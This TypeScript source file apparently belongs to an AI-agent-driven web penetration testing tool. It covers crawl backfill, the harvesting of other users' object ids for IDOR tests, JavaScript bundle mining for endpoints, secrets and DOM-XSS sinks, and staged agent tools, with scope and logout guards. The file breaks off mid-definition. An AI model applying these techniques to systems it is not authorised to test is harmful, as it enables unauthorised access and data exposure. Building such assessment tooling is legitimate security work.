/** Origin to resolve a screen's derived prefixes against: the screen's own observed origin, else the target's. Null if neither parses. */
function screenOrigin(sc: Pick<Screen, "observedUrls">, targetUrl: string): string | null {
  for (const u of sc.observedUrls) {
    try {
      return new URL(u).origin;
    } catch {
      /* not an absolute URL */
    }
  }
  try {
    return new URL(targetUrl).origin;
  } catch {
    return null;
  }
}

/** Derive the UNMAPPED parent-path prefixes implied by discovered deep paths, as absolute URLs to probe. MVC and
 *  directory layouts expose deep routes (/Account/AccountEdit, /Html/qa.html) whose PARENT (/Account, /Html) is often a
 *  real page that nothing ever linked to — so survey (which only enrolls what it navigated) never maps it, and the site
 *  tree shows it as an un-clickable folder. This lists every static ancestor that is NOT already a screen so a
 *  deterministic post-survey pass can probe it. Ancestors containing a dynamic segment ({id}) are skipped (not literally
 *  navigable); the root (/) has no parent. Origin-aware (a same path on two hosts stays distinct). Pure. */
export function deriveParentPrefixes(
  screens: ReadonlyArray<Pick<Screen, "urlTemplate" | "observedUrls">>,
  opts: { targetUrl: string; ignorePaths?: ReadonlyArray<string> },
): string[] {
  const have = new Set<string>(); // absolute (origin+path) of every enrolled screen — don't re-probe one that exists
  for (const sc of screens) {
    const origin = screenOrigin(sc, opts.targetUrl);
    if (origin) have.add(origin + "/" + templateSegs(sc.urlTemplate).join("/"));
  }
  const out = new Map<string, true>(); // absolute URL → dedup (insertion order preserved)
  for (const sc of screens) {
    const origin = screenOrigin(sc, opts.targetUrl);
    if (!origin) continue;
    const segs = templateSegs(sc.urlTemplate);
    for (let k = segs.length - 1; k >= 1; k--) {
      const prefixSegs = segs.slice(0, k);
      if (prefixSegs.some(isDynamicSeg)) continue; // {id} etc — can't navigate literally
      const abs = origin + "/" + prefixSegs.join("/");
      if (have.has(abs)) continue; // already an enrolled screen
      if (isSessionDestroyingPath(abs)) continue; // never GET a logout/signout prefix
      if (opts.ignorePaths && pathIsIgnored(abs, opts.ignorePaths, opts.targetUrl)) continue;
      out.set(abs, true);
    }
  }
  return [...out.keys()];
}

export type EnrolOutcome = "enrolled" | "duplicate" | "not_found" | "bounced" | "out_of_scope";

/** Enroll one URL by a cold browser GET-navigation, applying browser_navigate's guards but WITHOUT anchor recovery,
 *  referer-gated flagging, or the input sweep — used by the post-survey passes (parent-prefix backfill, LLM endpoint
 *  guessing) where onward discovery is moot. A 404 / error-or-login catch-all is NOT enrolled; a real page becomes a
 *  screen (deduped by DOM skeleton, so an echo/empty page collapses onto an existing one → "duplicate"). Best-effort. */
export async function enrolByNavigate(
  s: PilotSession,
  url: string,
): Promise<{ outcome: EnrolOutcome; screenId?: string; status?: number; finalUrl?: string }> {
  if (!isInScope(url, s.scope) || isSessionDestroyingPath(url)) return { outcome: "out_of_scope" };
  const key = stripHash(url);
  if (s.visited.has(key) || s.refererGated.has(key)) return { outcome: "duplicate" };
  const o = await s.driver.visit(url);
  s.visited.add(key); // probed — never retry, whatever the result
  if (o.status >= 400) return { outcome: "not_found", status: o.status, finalUrl: o.finalUrl };
  if (looksLikeErrorCatchAll(o)) return { outcome: "bounced", status: o.status, finalUrl: o.finalUrl }; // 404 page / login-bounce = not real
  const { screen, isNew } = recordObservation(s, o);
  await captureScreenshot(s, screen);
  return { outcome: isNew ? "enrolled" : "duplicate", screenId: screen.screenId, status: o.status, finalUrl: o.finalUrl };
}

/** Deterministic post-survey pass: probe each UNMAPPED parent-path prefix (deriveParentPrefixes) with a cold GET and
 *  enroll the ones that are real pages. Closes the coverage gap where a controller/directory prefix (/Account from
 *  /Account/AccountEdit) is a live page that nothing linked to, so survey never mapped it (an un-clickable folder in the
 *  site tree). No-op under a URL-list lock. Bounded (CAP) and logged; respects the survey screen cap. */
export async function backfillParentPrefixes(s: PilotSession): Promise<{ probed: number; enrolled: number }> {
  if (s.lockToSeeds) return { probed: 0, enrolled: 0 }; // URL-list lock: map only the seeds, no exploration
  const CAP = 40;
  const candidates = deriveParentPrefixes(s.inv.screens(), { targetUrl: s.targetUrl, ignorePaths: s.ignorePaths }).filter(
    (u) => !s.visited.has(stripHash(u)) && !s.refererGated.has(stripHash(u)),
  );
  const list = candidates.slice(0, CAP);
  let probed = 0;
  let enrolled = 0;
  for (const url of list) {
    if (s.maxSurveyScreens != null && s.inv.screens().length >= s.maxSurveyScreens) break; // honor the exploration cap
    probed += 1;
    try {
      if ((await enrolByNavigate(s, url)).outcome === "enrolled") enrolled += 1;
    } catch {
      /* best-effort: a parent-prefix probe must never break the survey */
    }
  }
  if (probed > 0) {
    s.store.appendEvent(s.assessmentId, {
      type: "note",
      payload: {
        message: `🧭 parent-prefix backfill: probed ${probed} unmapped parent path(s) → +${enrolled} enrolled${candidates.length > CAP ? ` (capped at ${CAP}; ${candidates.length - CAP} more not probed)` : ""}`,
      },
    });
  }
  return { probed, enrolled };
}

/** id-ish JSON key + value, and bare uuids, harvested from a captured response body (for cross-user IDOR). */
const BODY_ID_KEYVAL = /"(id|_id|uid|user_?id|account_?id|order_?id|customer_?id|owner_?id|object_?id|member_?id|tenant_?id|guid|uuid|email|username|slug)"\s*:\s*"?([A-Za-z0-9._%@+-]{1,64})"?/gi;
const BODY_BARE_UUID = /\b[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}\b/gi;

/** Mine object ids the agent has ALREADY seen in captured response bodies this run (list endpoints, JSON id/email
 *  fields) — the richest source of ANOTHER user's object id for cross-user IDOR, which the inventory scan alone misses. */
export function harvestBodyIds(records: ReadonlyArray<{ response: { body: string } }>, out: Set<string>): void {
  const CAP_RECORDS = 40;
  const CAP_BODY = 20_000;
  const CAP_TOTAL = 30;
  let hits = 0;
  for (const r of records.slice(-CAP_RECORDS)) {
    const body = r.response?.body;
    if (!body) continue;
    const slice = body.slice(0, CAP_BODY);
    for (const m of slice.matchAll(BODY_ID_KEYVAL)) {
      if (m[1] && m[2]) out.add(`${m[1]}=${m[2]}`);
      if (++hits >= CAP_TOTAL) return;
    }
    for (const m of slice.matchAll(BODY_BARE_UUID)) {
      if (m[0]) out.add(m[0]);
      if (++hits >= CAP_TOTAL) return;
    }
  }
}

/** Collect identifiers observed this run (for cross-user IDOR): id-typed params from the inventory (with a strengthened
 *  rule so camelCase / id-shaped values are caught, not just the stored guessedType) + ids seen in response bodies. */
function knownObjectIds(s: PilotSession): string[] {
  const out = new Set<string>();
  for (const sc of s.inv.screens()) {
    for (const p of sc.params) {
      if (!p.example) continue;
      // Trust the stored guessedType, but ALSO re-run the rule — a weak/LLM label may have missed userId, or an
      // ambiguous name (q, ref) whose EXAMPLE is id-shaped (uuid / multi-digit).
      if (p.guessedType === "object_ref" || p.guessedType === "id" || guessParamType(p.name, p.in, p.example) === "object_ref") {
        out.add(`${p.name}=${p.example}`);
      }
    }
    for (const u of sc.observedUrls.slice(0, 4)) {
      const seg = u.split("?")[0]?.split("/").filter(Boolean).pop() ?? "";
      if (/[a-z]*\d{2,}|^[0-9a-f-]{6,}$/i.test(seg)) out.add(seg);
    }
  }
  harvestBodyIds(s.evidence.records, out);
  return [...out].slice(0, 40);
}

function screenDigest(sc: Screen): Record<string, unknown> {
  return {
    screenId: sc.screenId,
    urlTemplate: sc.urlTemplate,
    authState: sc.authState,
    screenType: sc.screenType,
    labels: sc.labels,
    params: sc.params.map((p) => ({ name: p.name, in: p.in, type: p.guessedType })),
    apis: sc.apis.map((a) => ({ method: a.method, urlTemplate: a.urlTemplate })),
  };
}

/** Compact summary for get_inventory. The full digest (params/apis as arrays of objects) overflows context on large surveys
 *  (the bug where at 106K methodology couldn't get a screenId and lost its way) and is overkill for planning.
 *  Fold down to names only / endpoint strings to keep it small. The full per-param types are returned by get_screen in the diagnosis stage. */
function screenBrief(sc: Screen): Record<string, unknown> {
  return {
    screenId: sc.screenId,
    url: sc.urlTemplate,
    type: sc.screenType,
    auth: sc.authState,
    labels: sc.labels,
    params: sc.params.map((p) => p.name).join(",") || undefined,
    apis: sc.apis.slice(0, 12).map((a) => `${a.method} ${a.urlTemplate}`),
    ...(sc.apis.length > 12 ? { apisMore: sc.apis.length - 12 } : {}),
  };
}

export interface AnalyzeJsResult {
  page: string;
  analyzed: number;
  endpointsEnrolled: number;
  secretsFound: number;
  /** DOM-XSS sink candidates found across the bundles (leads → confirm with probe_dom_xss). */
  sinkCandidates: number;
  /** the actionable candidates (high/medium confidence), so the agent can drive probe_dom_xss at the route hints. */
  sinkLeads: Array<{ bundle: string; sink: string; source?: string; confidence: string; routeHint?: string; snippet: string }>;
  bundles: Array<Record<string, unknown>>;
  note?: string;
}

/**
 * Fetch a page's in-scope FIRST-PARTY <script src> bundles and mine each: enroll discovered endpoints as synthetic screens
 * (so diagnosis probes them), scan for hardcoded secrets, flag exposed source maps, and record a js_analyzed event
 * (deduped by URL). Driver-free (http/store/inv only) so it works from both the analyze_js tool AND the deterministic
 * post-survey pass. Returns a summary.
 */
export async function analyzePageJs(s: PilotSession, pageUrl: string): Promise<AnalyzeJsResult> {
  const empty: AnalyzeJsResult = { page: pageUrl, analyzed: 0, endpointsEnrolled: 0, secretsFound: 0, sinkCandidates: 0, sinkLeads: [], bundles: [] };
  if (!isInScope(pageUrl, s.scope)) return { ...empty, note: "out of scope" };
  let html = "";
  try {
    const r = await s.http.send({ method: "GET", url: pageUrl, headers: authHeaders(s), body: null });
    bumpHttp(s, r.status);
    html = r.body;
  } catch (e) {
    return { ...empty, note: `fetch error: ${String(e).slice(0, 120)}` };
  }
  // The scope gate naturally keeps this FIRST-party — a third-party CDN jQuery/analytics bundle is out of scope and skipped.
  const already = s.store.analyzedJsUrls(s.assessmentId);
  const srcs = new Set<string>();
  for (const m of html.matchAll(/<script[^>]+src=["']([^"']+)["']/gi)) {
    const raw = m[1];
    if (!raw) continue;
    let abs: string;
    try {
      abs = new URL(raw, pageUrl).toString();
    } catch {
      continue;
    }
    if (!/\.(m?js)(\?|#|$)/i.test(abs)) continue; // only .js/.mjs bundles
    if (!isInScope(abs, s.scope) || already.has(abs)) continue;
    srcs.add(abs);
  }
  const bundles = [...srcs].slice(0, 15);
  if (bundles.length === 0) return { ...empty, note: "no new in-scope first-party .js bundles" };

  const mask = (v: string): string => (v.length > 12 ? `${v.slice(0, 6)}…${v.slice(-4)}` : v);
  const perBundle: Array<Record<string, unknown>> = [];
  const sinkLeads: AnalyzeJsResult["sinkLeads"] = [];
  let totalEnrolled = 0;
  let totalSecrets = 0;
  let totalSinks = 0;
  let sinksTruncated = false;
  for (const burl of bundles) {
    let body = "";
    try {
      const r = await s.http.send({ method: "GET", url: burl, headers: authHeaders(s), body: null });
      bumpHttp(s, r.status);
      if (r.status >= 400) {
        perBundle.push({ url: burl, error: `status ${r.status}` });
        continue;
      }
      body = r.body;
    } catch (e) {
      perBundle.push({ url: burl, error: String(e).slice(0, 100) });
      continue;
    }
    // (1) endpoints → enroll each NEW in-scope one as its own synthetic screen (diagnosed by Stage 3)
    const refs = extractApiRefs([body], s.targetUrl);
    let enrolled = 0;
    for (const api of refs) {
      const built = apiCallToBuiltScreen(api, s.targetUrl);
      if (!built || !isInScope(built.observedUrl, s.scope) || isSessionDestroyingPath(built.observedUrl)) continue;
      const { screen, isNew } = s.inv.ingestBuilt(built);
      s.store.upsertScreen(s.assessmentId, screen);
      if (isNew) enrolled += 1;
    }
    totalEnrolled += enrolled;
    // (2) hardcoded secrets (values masked in the record; the agent re-verifies + record_finding for real ones)
    const secretsFound = impactOracle(body)
      .filter((i) => i.kind === "secret" || i.kind === "source-leak" || i.kind === "file-leak")
      .map((i) => ({ kind: i.kind, detail: `${i.detail}: ${mask(i.marker)}` }));
    totalSecrets += secretsFound.length;
    // (3) source-map exposure — inline sourceMappingURL, or a reachable <bundle>.map
    let sourceMap = /\/\/[#@]\s*sourceMappingURL=/.test(body);
    if (!sourceMap) {
      const b0 = burl.split(/[?#]/)[0] ?? burl;
      const mapUrl = `${b0}.map`;
      if (isInScope(mapUrl, s.scope)) {
        try {
          const mr = await s.http.send({ method: "GET", url: mapUrl, headers: authHeaders(s), body: null });
          bumpHttp(s, mr.status);
          sourceMap = mr.status === 200 && /"version"|"sources"/.test(mr.body.slice(0, 300));
        } catch {
          /* ignore */
        }
      }
    }
    // (4) DOM-XSS sink candidates — regex pre-filter + (when an LLM is present) an AI refinement pass over the slices.
    //     LEADS only: the agent confirms each at runtime with probe_dom_xss (evidence discipline). s.loginLlm is the
    //     session's fast LLM client (honours VERDICT_LLM_PROVIDER); undefined-safe = falls back to regex-only.
    const { sinks: sinksFound, truncated } = await analyzeJsSinksFull(s.loginLlm, burl, body);
    if (truncated) sinksTruncated = true;
    totalSinks += sinksFound.length;
    // Every DOM-XSS lead (all confidences) is worth a probe_dom_xss — static analysis of minified code is inherently
    // low-certainty, and the runtime probe is cheap + decisive. Collected here, then sorted high→low below.
    for (const k of sinksFound)
      sinkLeads.push({ bundle: burl, sink: k.sink, ...(k.source ? { source: k.source } : {}), confidence: k.confidence, ...(k.routeHint ? { routeHint: k.routeHint } : {}), snippet: k.snippet.slice(0, 120) });
    s.store.appendEvent(s.assessmentId, {
      type: "js_analyzed",
      payload: {
        url: burl,
        bytes: body.length,
        endpointsFound: refs.map((a) => `${a.method} ${a.urlTemplate}`),
        secretsFound,
        sinksFound,
        sourceMap,
        analyzedAt: new Date().toISOString(),
      },
    });
    perBundle.push({ url: burl, bytes: body.length, endpoints: refs.length, enrolled, secrets: secretsFound.length, sinks: sinksFound.length, sourceMap });
  }
  if (perBundle.length > 0)
    s.store.appendEvent(s.assessmentId, {
      type: "note",
      payload: { message: `📜 analyze_js ${pageUrl}: ${perBundle.length} bundle(s) → ${totalEnrolled} new endpoint screen(s), ${totalSecrets} secret hit(s), ${totalSinks} DOM-XSS sink candidate(s)${sinksTruncated ? " (a bundle hit the sink ceiling — some tail sinks unanalyzed)" : ""}` },
    });
  const rank = { high: 0, medium: 1, low: 2 } as const;
  sinkLeads.sort((a, b) => (rank[a.confidence as keyof typeof rank] ?? 3) - (rank[b.confidence as keyof typeof rank] ?? 3));
  // Surface EVERY candidate, only sorted (highest-confidence first). A generous ceiling avoids flooding the agent's
  // context on a pathological bundle; if it ever bites, the note above says the tail was left unanalyzed (never silent).
  const leadsShown = 40;
  return { page: pageUrl, analyzed: perBundle.length, endpointsEnrolled: totalEnrolled, secretsFound: totalSecrets, sinkCandidates: totalSinks, sinkLeads: sinkLeads.slice(0, leadsShown), bundles: perBundle };
}

export function buildTools(s: PilotSession) {
  return [
    // ───────────────────────── survey (STAGE 1) ─────────────────────────
    tool(
      "browser_navigate",
      "Navigate the browser to an in-scope URL. Registers the page as a screen (auto-enrolled into the coverage ledger) and returns its screenId plus state and newly discovered in-scope links.",
      { url: z.string() },
      async ({ url }) => {
        if (!isInScope(url, s.scope)) return txt(`BLOCKED: ${url} is out of scope`);
        // Don't navigate to logout/signout: it destroys the session and wipes out all subsequent auth diagnosis.
        if (isSessionDestroyingPath(url))
          return txt(`SKIPPED: ${url} is a logout/sign-out path. Navigating to it would break the auth session and wipe out all subsequent diagnosis, so it is not visited.`);
        try {
          const o = await s.driver.visit(url);
          // ── error/login catch-all guard ── if the cold navigation bounced to an ASP.NET aspxerrorpath / ErrX / login
          //   page, do NOT enroll it as a screen and do NOT seed its links to the frontier (that derails the crawl onto
          //   the error page). Flag the route referer-gated so it's reached by an in-app browser_click instead.
          if (looksLikeErrorCatchAll(o)) {
            // Anchor auto-recovery (opt-in via --anchor-url): the cold GET bounced, but the route may be reachable by
            // clicking its link from the goto-safe anchor hub. With no anchor set this whole block is skipped = unchanged.
            if (s.anchorUrl) {
              const rec = await reachViaAnchor(s, url);
              if (rec) {
                s.store.appendEvent(s.assessmentId, {
                  type: "note",
                  payload: { message: `🧭 ${url} bounced on cold nav → reached via anchor click → ${rec.screen.screenId}` },
                });
                return txt(
                  JSON.stringify({
                    recoveredViaAnchor: true,
                    screenId: rec.screen.screenId,
                    isNew: rec.isNew,
                    finalUrl: rec.screen.observedUrls[0] ?? url,
                    note: "This route bounces on a cold navigation but was reached by clicking its link from the anchor hub, and is now enrolled as a screen.",
                    frontierRemaining: s.frontier.size,
                  }),
                );
              }
            }
            s.refererGated.add(stripHash(url));
            s.frontier.delete(stripHash(url));
            s.store.appendEvent(s.assessmentId, {
              type: "note",
              payload: { message: `🚧 ${url} bounced to an error/login page (${o.finalUrl}) — referer-gated, not enrolled. Reach it via browser_click from a page that links to it.` },
            });
            return txt(
              JSON.stringify({
                refererGated: true,
                requested: url,
                bouncedTo: o.finalUrl,
                note: "This route bounces to an error/login catch-all on a cold navigation, so it was NOT recorded and its links were NOT added to the frontier. Do NOT browser_navigate it again — reach it with browser_click on its link from a page that lists it (the app needs in-app referer/session context).",
                frontierRemaining: s.frontier.size,
              }),
            );
          }
          const { screen, isNew } = recordObservation(s, o);
          await captureScreenshot(s, screen);
          // ── input sweep ── submit this screen's forms/searches with benign values and add any new routes/APIs to the frontier.
          const { exercised: swept, added: sweptAdded } = await runInputSweep(s, screen, isNew);
          return txt(
            JSON.stringify({
              screenId: screen.screenId,
              isNew,
              finalUrl: o.finalUrl,
              status: o.status,
              title: o.title,
              text: o.visibleText.slice(0, 500),
              links: o.links.slice(0, 40),
              clickables: (o.clickables ?? []).slice(0, 30), // non-anchor buttons — click the navigational ones to reach more screens
              forms: o.forms,
              firedApis: o.apiCalls.map((a) => ({ method: a.method, url: a.url, status: a.status })).slice(0, 30),
              inputSweep: s.inputSweep ? { exercised: swept, discovered: sweptAdded } : "disabled",
              frontierRemaining: s.frontier.size,
            }),
          );
        } catch (e) {
          return txt(`ERROR navigating ${url}: ${String(e).slice(0, 200)}`);
        }
      },
    ),
    tool(
      "browser_fill",
      'Fill a form field by CSS selector (e.g. [name="q"]).',
      { selector: z.string(), value: z.string() },
      async ({ selector, value }) =>
        txt((await s.driver.fill(selector, value)) ? `filled ${selector}` : `could not fill ${selector}`),
    ),
    tool(
      "browser_click",
      "Click an element by CSS selector. If the click reaches a new in-app view (SPA navigation — no full reload, so the session is preserved), it is recorded as a screen (auto-enrolled into the coverage ledger, deduped by DOM skeleton). This is how you map a route that dies on a direct/cold navigation: click its link instead of browser_navigate-ing it. Returns the resulting page state, screenId (if enrolled), and any fired APIs.",
      { selector: z.string() },
      async ({ selector }) => {
        const preUrl = s.driver.currentUrl();
        const clicked = await s.driver.clickFirst([selector]);
        const fired = s.driver.drainApiCalls();
        const snap = await s.driver.snapshot();
        // Enroll the clicked-to view as a screen. clickFirst() is page.click = an in-app pushState/hashchange nav with no
        // reload, so an SPA / nav-token session survives — the only way to enroll a referer/click-gated route. Synthesize
        // an Observation from the snapshot (buildScreenFromObservation ignores status/requestedUrl; dedups on skeleton, so
        // re-clicks of the same view don't duplicate). Skip error/login pages and logout.
        let enrolled: { screenId: string; isNew: boolean } | null = null;
        let swept = { exercised: 0, added: 0 };
        const o: Observation = {
          requestedUrl: preUrl || snap.url,
          finalUrl: snap.url,
          status: 200,
          title: snap.title,
          domSkeleton: snap.domSkeleton,
          visibleText: snap.visibleText,
          forms: snap.forms,
          links: snap.links,
          clickables: snap.clickables ?? [],
          virtualRoutes: snap.virtualRoutes,
          apiCalls: fired,
          scripts: [],
        };
        if (clicked && isInScope(snap.url, s.scope) && !isSessionDestroyingPath(snap.url) && !looksLikeErrorCatchAll(o)) {
          const wasGated = s.refererGated.has(stripHash(snap.url));
          const { screen, isNew } = recordObservation(s, o);
          await captureScreenshot(s, screen);
          s.refererGated.delete(stripHash(snap.url)); // reachable after all (via in-app click)
          enrolled = { screenId: screen.screenId, isNew };
          // Run the discovery engine on click-reached screens too (parity with browser_navigate) — skip only a KNOWN
          // referer-gated leaf, whose the sweep's cold-goto restore would bounce. Most click-reached screens are goto-safe.
          if (!wasGated) swept = await runInputSweep(s, screen, isNew);
        }
        return txt(
          JSON.stringify({
            clicked,
            ...(enrolled ? { screenId: enrolled.screenId, isNew: enrolled.isNew } : {}),
            url: snap.url,
            title: snap.title,
            forms: snap.forms,
            links: snap.links.slice(0, 40),
            clickables: (snap.clickables ?? []).slice(0, 30), // non-anchor buttons — click the navigational ones to reach more screens
            firedApis: fired.map((a) => ({ method: a.method, url: a.url, status: a.status })).slice(0, 30),
            ...(s.inputSweep ? { inputSweep: { exercised: swept.exercised, discovered: swept.added } } : {}),
            frontierRemaining: s.frontier.size,
          }),
        );
      },
    ),
    tool(
      "browser_upload",
      "Upload a file through a real browser form (Playwright setInputFiles) and submit it — use this when the upload is a JS-driven / DOM widget that http_request's `files` can't reach. Pass the file input `selector`, `filename`, `content` (text, e.g. an XXE SVG) OR `base64` (binary/magic-byte polyglot), optional contentType and submitSelector. Returns the resulting page + fired APIs; then check the outcome (rendered file / error) and probe with http_request(impact) for the effect (file read → the leaked content).",
      { selector: z.string(), filename: z.string(), content: z.string().optional(), base64: z.string().optional(), contentType: z.string().optional(), submitSelector: z.string().optional() },
      async ({ selector, filename, content, base64, contentType, submitSelector }) => {
        const b64 = base64 ?? Buffer.from(content ?? "", "utf8").toString("base64");
        const r = await s.driver.uploadFile(selector, filename, b64, contentType, submitSelector);
        const fired = s.driver.drainApiCalls();
        const snap = await s.driver.snapshot();
        const impact = impactOracle(snap.visibleText ?? "");
        return txt(
          JSON.stringify({
            ...r,
            url: snap.url,
            title: snap.title,
            firedApis: fired.map((a) => ({ method: a.method, url: a.url, status: a.status })).slice(0, 20),
            ...(impact.length ? { impact: impact.map((i) => ({ kind: i.kind, marker: i.marker })), impactHint: "concrete impact rendered on the page after upload — this is your effectMarker" } : {}),
            pageText: (snap.visibleText ?? "").slice(0, 800),
          }),
        );
      },
    ),
    tool(
      "survey_status",
      "Report mapping progress: screens discovered so far, how many in-scope links remain unvisited (the frontier), and a sample of those links. Use it to know what is still un-mapped before survey_done.",
      {},
      async () => {
        const screens = s.inv.screens();
        return txt(
          JSON.stringify({
            currentRole: s.currentRole || "unauth",
            rolesAvailable: availableRoles(s),
            screensDiscovered: screens.length,
            screensSample: screens.map((sc) => `${sc.authState === "post-login" ? "🔒" : ""}${sc.urlTemplate}`).slice(0, 40),
            visited: s.visited.size,
            frontierRemaining: s.frontier.size,
            frontier: [...s.frontier].slice(0, 40),
            ignoring: s.ignorePaths,
            exhaustive: s.exhaustive,
            ...(s.maxSurveyScreens != null ? { maxSurveyScreens: s.maxSurveyScreens } : {}),
            ...(s.surveyCapped ? { capReached: true, note: `screen cap (${s.maxSurveyScreens}) reached — exploration stopped; call survey_done (after logging in for each role if any are still un-authed).` } : {}),
          }),
        );
      },
    ),
    tool(
      "ignore_paths",
      "Dynamically prune the survey: mark in-scope path patterns as low-value so they're dropped from the frontier and not mapped further. Use when the frontier keeps growing with the SAME-skeleton content pages that add no new functional/interactive surface (e.g. a CMS article/news tree). `patterns` are path prefixes or globs with `*` (e.g. /artikel/, /news/*, /en/kultur/). A short `reason` is logged. Already-queued matching links are removed immediately; future links matching them are skipped. This does NOT delete already-mapped screens. (No effect when running --exhaustive / full-extraction.)",
      { patterns: z.array(z.string()).min(1), reason: z.string() },
      async ({ patterns, reason }) => {
        if (s.exhaustive)
          return txt("exhaustive mode: ignore is disabled — mapping the full surface. (run without --exhaustive to allow dynamic pruning.)");
        for (const p of patterns) if (p.trim()) s.ignorePaths.push(p.trim());
        let pruned = 0;
        for (const u of [...s.frontier]) {
          if (pathIsIgnored(u, s.ignorePaths, s.targetUrl)) {
            s.frontier.delete(u);
            pruned += 1;
          }
        }
        s.store.appendEvent(s.assessmentId, {
          type: "note",
          payload: { message: `🗑 ignore_paths +[${patterns.join(", ")}]: ${reason.slice(0, 120)} — frontier -${pruned} → ${s.frontier.size}` },
        });
        return txt(JSON.stringify({ ignoring: s.ignorePaths, prunedFromFrontier: pruned, frontierRemaining: s.frontier.size }));
      },
    ),
    tool(
      "survey_done",
      "Finish the SURVEY stage once the frontier is empty and every role's authenticated surface is mapped. Provide a one-line coverage summary.",
      { summary: z.string() },
      async ({ summary }) => {
        if (s.frontier.size > 0 && !s.surveyCapped) {
          return txt(`survey_done REFUSED — ${s.frontier.size} in-scope URL(s) remain unvisited. Continue mapping the frontier reported by survey_status before completing.`);
        }
        // Structural auth gate: if roles are configured but no authenticated session was ever established
        // (both currentCookie and Bearer empty), the entire post-login surface is unmapped = an anonymous survey.
        // Refuse survey_done here and require login() per role before completing (same "structurally prevent
        // eliding work" philosophy as evidence discipline / screen_done's coverage gate). Even the attended primary
        // is treated as unauthenticated until the manual login actually yields a cookie (currentRole being set isn't enough).
        const roles = availableRoles(s);
        const authActive = !!(s.currentCookie || s.currentBearer);
        if (!surveyAuthGate(roles.length, authActive).ok) {
          const names = roles.map((r) => (r.description ? `${r.name} (${r.description})` : r.name)).join(", ");
          s.store.appendEvent(s.assessmentId, {
            type: "note",
            payload: { message: `⛔ survey_done refused — ${roles.length} role(s) configured but no authenticated session active; post-login surface unmapped` },
          });
          return txt(
            `survey_done REFUSED — ${roles.length} role(s) are configured (${names}) but no authenticated session is active, so the entire post-login surface is unmapped (this is how a run silently drops from ~60 to ~30 screens). ` +
              `For EACH role: call login(role) — in attended mode this switches to the operator's live session; verify the response shows a cookie/bearer is present — then browser_navigate the authenticated pages it unlocks so they enter the inventory. ` +
              `Only call survey_done again once each role's authenticated surface is mapped. (If a target genuinely has no auth, no roles would be configured and this gate would not apply.)`,
          );
        }
        s.surveyDone = true;
        s.store.appendEvent(s.assessmentId, { type: "note", payload: { message: `🗺  SURVEY done: ${summary.slice(0, 300)}` } });
        return txt(`survey complete — ${s.inv.screens().length} screens mapped`);
      },
    ),

    // ───────────────────────── methodology (STAGE 2) ─────────────────────────
    tool(
      "get_inventory",
      "Return the mapped screen inventory as a COMPACT per-screen brief (screenId, url, type, auth, labels, param NAMES, API endpoints) — enough to plan an attack per screen and to spot multi-step workflows. PAGINATED so a large survey can't overflow the context: pass offset/limit (default limit 60, max 120); the response includes `total` and `nextOffset` (call again with nextOffset until it is null). Use the exact `screenId` values returned here for record_methodology.",
      { offset: z.number().optional(), limit: z.number().optional() },
      async ({ offset, limit }) => {
        const all = s.inv.screens();
        const off = Math.max(0, offset ?? 0);
        const lim = Math.min(Math.max(1, limit ?? 60), 120);
        const page = all.slice(off, off + lim);
        const nextOffset = off + page.length < all.length ? off + page.length : null;
        return txt(
          JSON.stringify({
            total: all.length,
            offset: off,
            returned: page.length,
            nextOffset,
            screens: page.map(screenBrief),
          }),
        );
      },
    ),
    tool(
      "record_methodology",
      "Record the attack plan for ONE screen: which vulnerability classes apply and concretely how to test them. Call once per screen; every screen must get a plan.",
      { screenId: z.string(), vulnClasses: z.array(z.string()), plan: z.string() },
      async ({ screenId, vulnClasses, plan }) => {
        // Reject if screenId isn't a real screen. Otherwise the diagnosis stage's plans.get(real-id) misses and the plan is silently lost
        //   (= the bug where the model guessed at the ID format and lost its way). Show real ID examples in the reject message to recover immediately.
        if (!s.inv.screens().some((x) => x.screenId === screenId)) {
          const sample = s.inv.screens().slice(0, 6).map((x) => x.screenId).join(", ");
          return txt(`REJECTED: '${screenId}' is not a mapped screenId. Use the EXACT screenId from get_inventory (e.g. ${sample || "s-0001"}). screen IDs look like s-0001, s-0002 — not paths. Call get_inventory (paginated) to read them.`);
        }
        s.store.appendEvent(s.assessmentId, { type: "methodology_recorded", payload: { screenId, vulnClasses, plan } });
        s.plans.set(screenId, `classes=[${vulnClasses.join(",")}] ${plan}`);
        s.store.appendEvent(s.assessmentId, {
          type: "note",
          payload: { message: `📋 PLAN ${screenId}: [${vulnClasses.join(",")}] ${plan.slice(0, 200)}` },
        });
        return txt(`planned ${screenId} (${s.plans.size}/${s.inv.screens().length} screens planned)`);
      },
    ),
    tool(
      "methodology_done",
      "Finish the METHODOLOGY stage once every screen has a recorded plan.",
      { summary: z.string() },
      async ({ summary }) => {
        const missing = s.inv.screens().filter((screen) => !s.plans.has(screen.screenId));
        if (missing.length) return txt(`REJECTED: record_methodology is still required for ${missing.map((screen) => screen.screenId).join(", ")}`);
        s.store.appendEvent(s.assessmentId, { type: "methodology_completed", payload: { screenIds: s.inv.screens().map((screen) => screen.screenId), summary } });
        s.methodologyDone = true;
        s.store.appendEvent(s.assessmentId, { type: "note", payload: { message: `📋 METHODOLOGY done: ${summary.slice(0, 300)}` } });
        return txt(`methodology complete — ${s.plans.size} plans`);
      },
    ),

    // ───────────────────────── diagnosis (STAGE 3) ─────────────────────────
    tool(
      "get_screen",
      "Return the screen currently under diagnosis: its full detail, its planned checks, the roles available, and known object ids seen on other screens (for cross-user access-control tests).",
      { screenId: z.string().optional() },
      async ({ screenId }) => {
        const id = screenId ?? s.currentScreenId;
        const sc = s.inv.screens().find((x) => x.screenId === id);
        if (!sc) return txt(`no screen '${id}'`);
        return txt(
          JSON.stringify({
            screen: { ...screenDigest(sc), observedUrls: sc.observedUrls.slice(0, 6), description: sc.description },
            plan: s.plans.get(sc.screenId) ?? "(no recorded plan — use judgement)",
            // The checklist that must be worked through. screen_done requires coverage of each class (prevents stopping after the first find).
            plannedClasses: plannedClassesFor(s.plans.get(sc.screenId)),
            currentRole: s.currentRole || "unauth",
            rolesAvailable: availableRoles(s),
            knownObjectIds: knownObjectIds(s),
            alreadyConfirmed: [...s.findingsByKey.keys()],
          }),
        );
      },
    ),
    tool(
      "http_request",
